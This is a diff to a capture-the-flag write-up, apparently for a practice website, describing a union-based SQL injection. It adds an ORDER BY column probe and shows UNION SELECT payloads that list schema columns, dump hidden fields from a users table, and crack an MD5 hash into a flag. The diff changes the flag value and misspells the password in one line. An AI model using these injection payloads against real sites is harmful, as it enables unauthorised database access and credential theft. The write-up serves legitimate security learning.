@@ -14,6 +14,19 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 ```
 So the website sends directly the input to SQL, and maybe we can use that.
 
+First, we need to find the correct number of columns in the database.
+
+``` sql
+1 ORDER BY 1 --
+1 ORDER BY 2 --
+1 ORDER BY 3 --
+```
+We assume that the database uses this syntax.
+``` sql
+SELECT col1, col2 FROM table WHERE id = ?
+```
+
+
 We used the union-based SQL query to access some more informations about the members table.
 > In SQL language, the UNION operator is used to merge the result of 2 queries, this adds the desired data to the data present in the first SQL query.
 
@@ -22,9 +35,8 @@ We used the union-based SQL query to access some more informations about the mem
 5 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
-To see all columns from users.
-
-We observe some columns that are not displayed, e.g. `Commentaire` and `countersign`.
+This allowed us to list all columns from all tables, including the users table.
+We noticed that some columns, such as commentaire and countersign, were not visible in the original page.
 
 ```sql
 5 UNION SELECT commentaire, countersign FROM users
@@ -35,9 +47,13 @@ it gives us, amongst the others user_id (1, 2, 3 and 4), for the 5th:
 ID: 5 UNION SELECT commentaire, countersign FROM users 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
 ```
 
---> after doing these steps, we had the flag `3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5`
+Once again, it's MD5, and when we decrypt it, we get FortyTwo.
+
+And fortwho in SHA256 : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
 
 ## Danger
 
